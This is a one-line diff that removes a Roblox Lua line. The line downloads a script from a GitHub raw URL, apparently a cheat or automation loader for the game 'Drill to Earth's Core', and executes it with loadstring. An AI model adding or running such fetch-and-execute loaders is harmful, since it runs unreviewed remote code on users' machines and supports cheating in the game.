@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/drill-to-earth-s-core-spam5-rkwz15axo8nuer.lua"))()
